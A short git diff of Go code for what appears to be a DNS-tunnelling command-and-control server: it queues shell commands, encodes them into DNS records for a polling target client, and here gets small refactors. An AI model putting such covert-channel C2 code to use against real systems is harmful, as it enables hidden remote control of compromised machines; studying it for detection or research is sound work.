@@ -32,8 +32,7 @@ func NewDnsServer(port string, encoder encoder.StringEncoder, callbackChan chan 
 
 func (s DNSServer) Serve() {
 	server := s.createServer()
-
-	fmt.Println("Starting DNS server on port 8090")
+	fmt.Println("Starting Listener on port 8090")
 	err := server.ListenAndServe()
 	if err != nil {
 		fmt.Printf("Failed to start server: %s\n", err.Error())
@@ -51,9 +50,6 @@ func (s DNSServer) createServer() *dns.Server {
 }
 
 func (s DNSServer) QueueCommand(command string) {
-	//todo: handle empty command
-	//todo: handle close command -> terminate the target client
-	//todo: handle quit command -> quit server side shell only, initiate sleep idle
 	s.queue.Enqueue(command)
 }
 
@@ -66,12 +62,7 @@ func (s DNSServer) handlePolling() string {
 
 func (s DNSServer) buildAnswer(command string) []dns.RR {
 	encoded := s.encoder.Encode(command)
-	split := s.messageSplitter.Split(encoded)
-	var answer []dns.RR
-	for i := range split {
-		answer = append(answer, split[i])
-	}
-	return answer
+	return s.messageSplitter.Split(encoded)
 }
 
 func (s DNSServer) createAnswerMessage(r *dns.Msg) *dns.Msg {
@@ -103,7 +94,7 @@ func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 		} else {
 			command = "idle"
 		}
-		msg.Answer = h.server.buildAnswer(command)
+		msg.Extra = h.server.buildAnswer(command)
 	}
 	h.server.writeMessage(w, msg)
 }
